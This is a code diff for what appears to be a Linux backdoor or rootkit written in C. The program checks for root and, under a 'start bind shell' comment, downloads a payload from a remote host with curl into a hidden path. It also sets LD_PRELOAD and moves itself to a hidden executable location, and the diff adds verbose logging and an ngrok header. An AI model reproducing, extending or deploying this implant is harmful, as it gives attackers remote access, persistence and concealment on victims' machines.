@@ -6,7 +6,6 @@
 #endif
 
 int main(int argc, char **argv, char **envp) {
-
     if (getuid() != 0) {
         printf("Invalid\n");
         exit(0);
@@ -29,11 +28,12 @@ int main(int argc, char **argv, char **envp) {
         exit(0);
     }
 
+    setgid_s();
+
     int downloaded = is_downloaded();
 
     // start bind shell
     if (downloaded == 0) {
-        setgid_s();
         download();
         set_ld_preload();
         move(argv[0]);
@@ -153,7 +153,11 @@ int download() {
     printf("Downloading...\n");
 #endif
     char command[1024];
-    sprintf(command, "curl -o %s https://%s/%s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2);
+    #define NGROK_SKIP_HEADER "--header \"ngrok-skip-browser-warning: skip-browser-warning\""
+    sprintf(command, "curl -o %s https://%s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, "");
+#ifdef VERBOSE
+    printf("%s\n", command);
+#endif
     system(command);
     return 0;
 }
@@ -164,8 +168,14 @@ int move(char* filename) {
 #endif
     char command[1024];
     sprintf(command, "mv %s %s", filename, HIDDEN_EXEC_PATH);
+#ifdef VERBOSE
+    printf("%s\n", command);
+#endif
     system(command);
     sprintf(command, "chmod +x %s", HIDDEN_EXEC_PATH);
+#ifdef VERBOSE
+    printf("%s\n", command);
+#endif
     system(command);
     return 0;
 }
